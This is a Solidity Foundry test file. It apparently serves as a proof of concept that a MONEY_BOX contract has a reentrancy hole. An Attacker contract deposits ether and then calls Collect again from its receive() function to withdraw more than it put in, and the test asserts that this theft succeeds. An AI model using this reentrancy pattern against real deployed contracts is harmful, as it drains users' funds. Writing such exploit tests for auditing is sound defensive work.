
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MONEY_BOX} from "../src/MONEY_BOX.sol";

contract TestReentrancyMONEY_BOX is Test {
    MONEY_BOX public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MONEY_BOX();

        // Configure MONEY_BOX
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.SetLogFile(address(new LogMock()));
        _contractUnderTest.Initialized();

        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // Fund victim and attacker and this test contract
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Warp time so unlockTime condition can be satisfied
        vm.warp(block.timestamp + 1000);

        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    receive() external payable {}
}

contract Attacker {
    MONEY_BOX public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = MONEY_BOX(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into MONEY_BOX via Put so that:
        // - balance >= MinSum
        // - unlockTime is set in the past (we already warped in the test)
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        initialSnapshot = address(this).balance;

        // Ensure we try to withdraw at most our recorded balance
        uint256 withdrawAmount = val;
        if (withdrawAmount > address(victim).balance) {
            withdrawAmount = address(victim).balance;
        }

        victim.Collect(withdrawAmount);

        // Exploit succeeded if we gained more than our initial balance
        if (address(this).balance > initialSnapshot) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;

            uint256 withdrawAmount = storedAttackVal;
            if (withdrawAmount > address(victim).balance) {
                withdrawAmount = address(victim).balance;
            }

            victim.Collect(withdrawAmount);
        }
    }
}

contract LogMock {
    struct Message {
        address Sender;
        string Data;
        uint256 Val;
        uint256 Time;
    }

    Message[] public History;
    Message LastMsg;

    function AddMessage(address _adr, uint256 _val, string memory _data) public {
        LastMsg.Sender = _adr;
        LastMsg.Time = block.timestamp;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}
